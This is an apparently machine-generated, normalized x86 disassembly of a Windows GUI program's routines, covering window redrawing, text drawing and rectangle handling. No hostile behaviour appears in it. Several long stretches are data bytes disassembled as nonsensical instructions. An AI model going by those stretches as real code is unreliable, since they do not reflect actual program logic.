mov eax [ eax + 0x10 ]
cmp eax [ ebp - 0x8 ]
je r-xdata
mov eax [ edi + 0x8 ]
mov eax [ eax + 0x14 ]
cmp eax [ ebp - 0x4 ]
je r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
sub eax esi
dec eax
mov [ ebp - 0x10 ] eax
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
mov eax ebx
call sub_45c380
push eax
call InvalidateRect
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
sub eax esi
dec eax
mov [ ebp - 0xc ] eax
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
mov eax ebx
call sub_45c380
push eax
call InvalidateRect
sub_436248
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] 0xff000014
cmp al 0x1
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] 0xff000010
cmp al 0x1
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] 0xff000010
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] 0xff000014
sub_436280
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x1c ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4363e2
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov al [ ebx + 0x212 ]
test al al
je r-xdata
mov eax [ ebx + 0x70 ]
push eax
mov edx [ ebx + 0x218 ]
push edx
lea edx [ ebp - 0x18 ]
mov ecx eax
mov eax [ ebx + 0x208 ]
call sub_4357cc
mov al [ ebx + 0x211 ]
test al al
je r-xdata
push ebp
call sub_436248
pop ecx
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x214 ]
push eax
lea edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
mov eax [ ebx + 0x208 ]
call sub_4357cc
mov esi [ ebx + 0x208 ]
call sub_44ae1c
call sub_44aefc
test al al
je r-xdata
push ebp
call sub_436248
pop ecx
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x214 ]
push eax
lea edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
mov eax [ ebx + 0x208 ]
call sub_4357cc
mov edx [ ebx + 0x70 ]
mov eax [ esi + 0x14 ]
call sub_424f74
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_425318
mov eax ebx
call sub_45d53c
test al al
jne r-xdata
mov [ ebp - 0x14 ] edx
add eax edx
mov [ ebp - 0xc ] eax
xor eax eax
mov al [ ebx + 0x220 ]
mov edi [ eax * 4 + rw-data ]
or edi 0x44
mov edx edi
mov eax ebx
call sub_457d2c
mov edi eax
push edi
lea eax [ ebp - 0x18 ]
push eax
push 0xffffffff
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_455a4c
mov eax [ ebp - 0x1c ]
call sub_40443c
push eax
mov eax esi
call sub_425738
push eax
call DrawTextA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4363e9
lea eax [ ebp - 0x1c ]
call sub_403f7c
retn
adc edx 0x0
mov dl 0x1
mov eax [ esi + 0x14 ]
call sub_425090
mov edx [ ebx + 0x68 ]
mov eax esi
call sub_425658
mov edx r-xdata
mov eax esi
call sub_4255b4
mov edx [ ebp - 0xc ]
add edx [ ebp - 0x14 ]
sub edx eax
sar edx 0x1
jns r-xdata
sub_436494
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4583b4
mov eax [ ebx + 0x218 ]
neg eax
push eax
mov edx [ ebx + 0x218 ]
neg edx
push eax
push esi
call InflateRect
xor eax eax
cmp [ ebx + 0x212 ] 0x0
je r-xdata
cmp [ ebx + 0x211 ] 0x0
je r-xdata
add eax [ ebx + 0x214 ]
mov edx eax
neg edx
push edx
neg eax
push edx
push esi
call InflateRect
pop esi
pop ebx
retn
add eax [ ebx + 0x214 ]
sub_4364ec
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5c ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_45afdc
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x1
xor edx edx
push ebp
push sub_43660d
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
lea esi [ eax + 0x44 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x5b ]
dec al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4c ] 0x0
jne r-xdata
dec al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_45afdc
call sub_403a64
jmp r-xdata
mov edx [ ebp - 0xc ]
sub edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_45522c
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4c ] 0x0
jne r-xdata
dec al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
push eax
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x44 ]
sub ecx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x40 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
jne r-xdata
dec al
je r-xdata
mov edx [ ebp - 0x10 ]
sub edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_455208
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax [ ebp - 0x18 ]
push eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x44 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x40 ]
sub edx eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
jmp r-xdata
sub_436628
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x210 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov ecx edi
mov edx esi
mov eax ebx
call sub_45ce84
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_436654
push ebx
push esi
mov ebx edx
mov esi eax
test bl bl
je r-xdata
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov [ esi + 0x21f ] 0x1
mov edx ebx
mov eax esi
call sub_45d544
pop esi
pop ebx
retn
sub_436690
push 0x11004896
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add [ edx ] dl
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add [ ebx ] dl
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add [ edi + edi * 8 ] dl
add [ eax ] al
push 0x15004896
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add [ esi ] dl
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add [ edi ] dl
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add [ eax ] bl
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add [ ecx ] bl
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add [ edx ] bl
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add [ ebx ] bl
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add [ edi + edi * 8 ] bl
add [ eax ] al
push 0x1d004896
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add [ esi ] bl
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add [ edi ] bl
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add [ eax ] al
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add [ ecx ] al
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add [ edx ] al
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add [ ebx ] al
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add [ edi + edi * 8 ] al
add [ eax ] al
push 0x5004896
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add [ esi ] al
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add [ edi ] al
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add [ eax ] cl
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add [ ecx ] cl
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add [ edx ] cl
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add [ ebx ] cl
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add [ edi + edi * 8 ] cl
add [ eax ] al
push 0xd004896
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add [ esi ] cl
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add [ edi ] cl
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add al dh
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add cl dh
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add dl dh
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add bl dh
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add ah dh
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add ch dh
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add dh dh
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add bh dh
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add al bh
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add cl bh
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add dl bh
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add bl bh
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add ah bh
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add ch bh
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add dh bh
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add bh bh
inc [ eax ]
add [ edi ] ch
add [ eax ] al
add ah ch
or cl [ eax ]
add [ eax + 0x43 ] ch
add ah ah
or cl [ eax ]
clc
inc ebx
add ah bl
or cl [ eax ]
sub_4369fc
push 0xe0004896
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add cl ah
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add dl ah
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add bl ah
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add ah ah
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add ch ah
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add dh ah
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add bh ah
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add al ch
inc [ eax ]
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_436a69
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_436a70
retn
sub_436a7c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_436aad
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_436ab4
retn
mov eax [ rw-data ]
call sub_4031ec
sub_436b48
dec esp
imul eax [ ebx ] 0x3
or eax 0x74754254
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
dec esp
popad
jns r-xdata
inc ebp
add al bl
xchg ebx eax
inc ecx
add ah al
mov [ ebx ] eax
sbb al 0x4f
inc ebp
add [ eax + 0x3400454e ] cl
pop eax
inc edx
jne r-xdata
xor al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov [ ebx + eax * 2 ] ch
and al 0x0
add [ eax ] al
mov eax 0x34004505
jne r-xdata
adc dh [ eax - 0x4fec4fdc ]
adc al 0xb0
out dx eax
add [ edi * 2 + 0x581c0045 ] al
inc ebp
add [ esi + ecx * 2 + 0x45 ] dl
add [ eax + 0x20004559 ] ch
pop ecx
inc ebp
add [ esp + ebx * 2 ] dh
inc ebp
add al ah
pop edx
inc ebp
add ah cl
insb
inc ebp
add [ eax + 0x2000457d ] cl
pop edi
inc ebp
add [ edi + ebx * 2 + 0x50080045 ] dl
inc ebp
add [ edi + ebx * 2 + 0x45 ] dh
add [ eax ] ch
test [ ebx ] eax
adc [ eax ] al
add eax [ edx ]
or al 0xb0
sbb [ eax - 0x4ff14ffa ] dh
inc ebp
add [ edx + ebx + 0x42 ] dh
add [ edi + edx + 0x42 ] bl
add [ edi + edx + 0x42 ] dl
add [ edx + ebx + 0x42 ] bh
add [ eax ] dh
test [ ebx ] al
shr [ ecx + 0x45 ] 0x1
add ah cl
imul eax [ ebp ] sub_456a9c
nop
dec ebp
inc ebp
add ah dl
push esp
inc ebp
add [ eax ] bh
push esp
inc ebp
add [ eax + 0x5d ] ah
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + 0x6b ] cl
inc ebx
add [ ebx ] cl
bound ebp [ edi + eax * 2 + 0x6c ]
jns r-xdata
add [ eax + ebx * 2 ] dh
outsb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x436cec90
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
insd
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + ebp * 2 + 0x43 ] bh
add dh bl
insd
inc ebx
add [ ecx + eax + 0x1bb40000 ] al
inc ebp
add [ edx + ebx + 0x42 ] bl
add [ eax + 0x34 ] al
inc eax
add [ eax + 0x48004213 ] dh
xor al 0x40
add [ eax + 0x6e ] ah
inc ebp
add [ ecx + esi + 0x31a00040 ] al
inc eax
add al dh
test [ ebx ] al
inc eax
jpo r-xdata
add [ eax + 0x2400436c ] cl
add [ eax ] al
add [ eax + 0x34004505 ] bh
push 0x7466654c
or al 0x62
insb
inc edi
insb
jns r-xdata
inc ebp
add al bl
dec esp
inc ebp
add ah bl
dec esp
inc ebp
add al bl
jl r-xdata
pushad
pop ebp
add [ eax ] bh
outsd
add [ eax + 0x34 ] al
inc eax
add [ esp + esi + 0x40 ] al
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] dh
inc eax
push 0x68676952
je r-xdata
or eax 0x6c476c62
bound ebp [ edi + eax * 2 + 0x6c ]
jns r-xdata
dec edx
inc ebp
add [ eax + 0x48004031 ] ah
sbb eax [ edx ]
push eax
add [ ebx ] 0x7c
sbb eax [ edx ]
mov al 0x49
inc ebp
add [ eax + 0x5c00421b ] dh
push 0x74746f42
outsd
insd
pop es
inc edx
jne r-xdata
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ eax + 0x1b ] cl
inc edx
add [ eax - 0x7d ] dl
inc ebx
dec eax
xor al 0x40
jns r-xdata
push 0xd706f54
bound ebp [ edi + eax * 2 + 0x6c ]
add [ eax - 0x4fffbab7 ] dh
sbb eax [ edx ]
pop esp
inc edx
je r-xdata
add [ ebx + ebx + 0x42 ] bh
outsb
jae r-xdata
adc [ eax + 0x3c ] ch
imul eax [ ebx ] 0xffffffc3
jmp sub_403980
shr [ eax + 0x100436b ] 0xa
push esp
dec esi
jne r-xdata
add [ eax ] al
sbb eax [ edx ]
xchg esp eax
sbb eax [ edx ]
call 0xffffffff9c43ae48
dec eax
inc ebp
add [ ebx + eax * 4 + 0x43 ] dh
add [ edx + ecx * 2 + 0x45 ] bl
inc edi
insb
jns r-xdata
add [ eax ] dl
dec ecx
inc ebp
add al al
add [ ebx ] 0x1c
pop ds
inc esi
add [ eax + 0x4400454a ] cl
dec ecx
inc ebp
add [ eax + 0x1f ] bl
inc esi
add [ edi + ebx + 0x46 ] ch
add [ ecx + ecx * 2 + 0x45 ] bh
add [ edi + ebx + 0x49d80046 ] dl
inc ebp
add al dh
add [ ebx ] 0xfffffff8
dec ecx
inc ebp
add [ eax ] dl
test [ ebx ] al
or al 0x4b
inc ebp
add ah ch
dec edx
inc ebp
add [ ebx + ecx * 2 ] ch
inc ebp
add [ eax ] bl
dec edx
inc ebp
add [ eax - 0x43ffb9e1 ] bh
pop ds
inc esi
add [ edx + ecx * 2 ] bh
inc ebp
add [ edi + eax * 2 + 0x54160045 ] ch
push ebx
jo r-xdata
inc edx
add [ ebx + ebx + 0x1be80042 ] dl
inc edx
add [ eax + ecx * 2 - 0x7c8bffbb ] bl
inc ebx
push 0x10173
add [ eax ] al
add al 0x0
add [ eax ] al
lea eax [ eax ]
or al 0x6c
inc ebx
sub_437120
add al cl
jpe r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax [ eax ]
or cl [ edi + 0x6e ]
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
rol [ eax ] 0x1
add bh bh
rol [ eax ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and al 0x0
or ecx [ edi + 0x6e ]
dec ebp
outsd
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and [ eax ] eax
pop es
push esi
imul esi [ ebx + 0x69 ] 0xf0656c62
pop edi
inc ecx
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
inc ebx
add [ eax + 0x78000000 ] cl
and [ ebp ] al
pop esp
sbb al [ edx ]
inc eax
xor al 0x40
add [ eax + 0x48004213 ] dh
xor al 0x40
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ eax + 0x48004373 ] bh
cmp [ esi ] al
sar [ ebx ] 0x1
inc esi
add [ eax + 0x3c004637 ] cl
pop ss
inc edx
add [ eax ] cl
push ss
inc edx
add [ edi + edx + 0x42 ] cl
add [ eax + ebx + 0x42 ] al
add [ edx + ebx + 0x42 ] dh
add [ edi + edx + 0x42 ] bl
add [ edi + edx + 0x42 ] dl
add [ edx + ebx + 0x42 ] bh
add [ ecx + ebp + 0x46 ] bh
add [ ebx + esi + 0x46 ] bh
add al dh
fadd [ ebp ]
test [ eax + 0x46 ] al
add [ eax ] dl
inc ecx
inc esi
add [ esi + ebx * 8 ] dh
inc ebp
add [ edx ] cl
push esp
inc edi
insb
jns r-xdata
inc esp
outsd
ja r-xdata
inc eax
add ah dl
je r-xdata
push 0x7473694c
nop
nop
jb r-xdata
call 0xffffffffd843b6b2
add [ eax ] al
inc eax
add [ ebx ] cl
push esp
inc edi
insb
jns r-xdata
inc ebx
add [ edi ] al
or dl [ edi + eax * 2 + 0x6c ]
jns r-xdata
add [ eax ] al
add [ esp + edx * 2 ] cl
inc edx
jne r-xdata
mov eax esi
test bl bl
je r-xdata
sar esp 0xff
push 0x68636143
push esp
jae r-xdata
push 0x7473694c
cmp al 0x72
inc ebx
add [ ecx ] dl
inc ebp
add [ eax + eax ] cl
pop es
inc edx
jne r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
dec [ ebx - 0x31d7f2d ]
je r-xdata
inc eax
add [ eax ] ch
jbe r-xdata
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push esp
jae r-xdata
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a0
mov eax esi
call sub_462a1c
test bl bl
jle r-xdata
push ds
mov esi 0xd38bfffc
outsb
inc edi
insb
jns r-xdata
add [ eax ] dh
add [ eax ] al
add [ eax ] ah
adc [ eax ] eax
xor al 0x34
inc eax
add [ eax + 0x34 ] al
inc eax
add [ esp + esi + 0x40 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + esi * 2 + 0x43 ] dl
outsb
jae r-xdata
and dl 0xfc
push 0x5500408d
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
add ah bh
jb r-xdata
mov ebx edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
xor edx edx
mov eax esi
call sub_4629c8
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031bc
mov [ esi + 0x80 ] eax
add esp 0xfffffff0
call sub_403550
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
add [ eax ] al
add [ eax ] ah
adc [ eax ] eax
xor al 0x34
inc eax
add [ eax + 0x34 ] al
inc eax
add [ esp + esi + 0x40 ] al
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
sub_437364
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
xor edx edx
mov eax esi
call sub_4629c8
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031bc
mov [ esi + 0x80 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403550
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_4373b8
push ebx
push esi
call sub_4035b8
mov ebx edx
mov esi eax
mov eax [ esi + 0x80 ]
call sub_4031ec
mov edx ebx
and dl 0xfc
mov eax esi
call sub_462a1c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a0
sub_4373e8
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x80 ]
call sub_419334
mov esi eax
mov eax [ ebx + 0x80 ]
cmp esi [ eax + 0x4 ]
jl r-xdata
mov cl 0x1
mov edx esi
mov eax [ ebx + 0x80 ]
call sub_4192f0
mov eax esi
pop esi
pop ebx
retn
xor ecx ecx
xor edx edx
mov eax ebx
call sub_462e50
mov esi eax
lea edx [ esi + 0x1 ]
mov eax [ ebx + 0x80 ]
call sub_41924c
sub_437434
push ebx
push esi
push edi
push ebp
mov ebp ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_4373e8
mov esi eax
push ebp
mov ecx edi
mov edx esi
mov eax ebx
call sub_46305c
inc [ ebx + 0x84 ]
mov eax esi
pop ebp
pop edi
pop esi
pop ebx
retn
sub_437460
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x80 ]
call sub_41931c
test al al
je r-xdata
pop esi
pop ebx
retn
dec [ ebx + 0x84 ]
xor ecx ecx
mov edx esi
mov eax [ ebx + 0x80 ]
call sub_4192f0
sub_437490
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4031bc
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031bc
mov [ esi + 0x4 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403550
mov eax esi
pop esi
pop ebx
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_4374d4
push ebx
push esi
call sub_4035b8
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_4031ec
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4031dc
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a0
sub_437504
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] ecx
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov eax [ esp ]
push eax
mov ecx ebp
mov dl 0x1
mov eax [ r-xdata ]
call sub_437364
mov ebx eax
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_418c68
mov eax [ edi + 0x4 ]
mov edx esi
call sub_418dc4
mov ebx eax
cmp ebp [ ebx + 0x34 ]
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov eax [ ebx + 0x30 ]
cmp eax [ esp ]
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_437564
push ebx
mov ebx edx
test ebx ebx
je r-xdata
pop ebx
retn
cmp [ ebx + 0x84 ] 0x0
jne r-xdata
mov edx ebx
mov eax [ eax + 0x4 ]
call sub_418f60
mov eax ebx
call sub_4031ec
sub_437594
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_4031bc
mov dl 0x1
mov eax [ r-xdata ]
call sub_429e14
mov esi eax
mov [ ebx + 0x4 ] esi
mov [ esi + 0x14 ] ebx
mov [ esi + 0x10 ] sub_4376c8
mov [ ebx + 0x1c ] 0x8080
mov [ ebx + 0x20 ] 0x1
xor eax eax
add esp 0xfffffff0
call sub_403550
xor edx edx
mov dl al
mov [ ebx + edx * 4 + 0xc ] 0xffffffff
inc eax
cmp al 0x4
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_437490
mov [ rw-data ] eax
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_437628
push ebx
push esi
call sub_4035b8
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_4031ec
mov eax esi
call sub_437684
cmp [ rw-data ] 0x0
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4031dc
test bl bl
jle r-xdata
mov eax [ rw-data ]
call sub_437588
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a0
mov eax [ rw-data ]
call sub_4031ec
xor eax eax
mov [ rw-data ] eax
sub_437684
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov [ esi + edi * 4 + 0xc ] 0xffffffff
inc ebx
cmp bl 0x4
jne r-xdata
mov edx eax
mov eax [ esi + 0x8 ]
call sub_437460
mov edi ebx
and edi 0x7f
mov eax [ esi + edi * 4 + 0xc ]
cmp eax 0xffffffff
je r-xdata
mov edx [ esi + 0x8 ]
mov eax [ rw-data ]
call sub_437564
xor eax eax
mov [ esi + 0x8 ] eax
pop edi
pop esi
pop ebx
retn
sub_4376c8
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x4 ]
cmp edx esi
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_42a4c8
mov [ ebx + 0x1c ] eax
mov eax ebx
call sub_437684
cmp [ ebx + 0x2a ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_4376f8
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_437684
mov edx ebx
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test eax eax
jle r-xdata
mov eax ebx
call sub_42a4c8
mov [ esi + 0x1c ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
pop edx
xchg edx eax
mov ecx edx
cdq
idiv ecx
test edx edx
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
pop edx
xchg edx eax
mov ecx edx
cdq
idiv ecx
cmp eax 0x4
jle r-xdata
mov edx eax
mov eax esi
call sub_437770
mov eax 0x1
sub_437770
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x20 ]
je r-xdata
pop esi
pop ebx
retn
test bl bl
jbe r-xdata
mov eax esi
call sub_437684
mov [ esi + 0x20 ] bl
mov edx [ esi + 0x4 ]
mov eax esi
call sub_4376c8
sub_437798
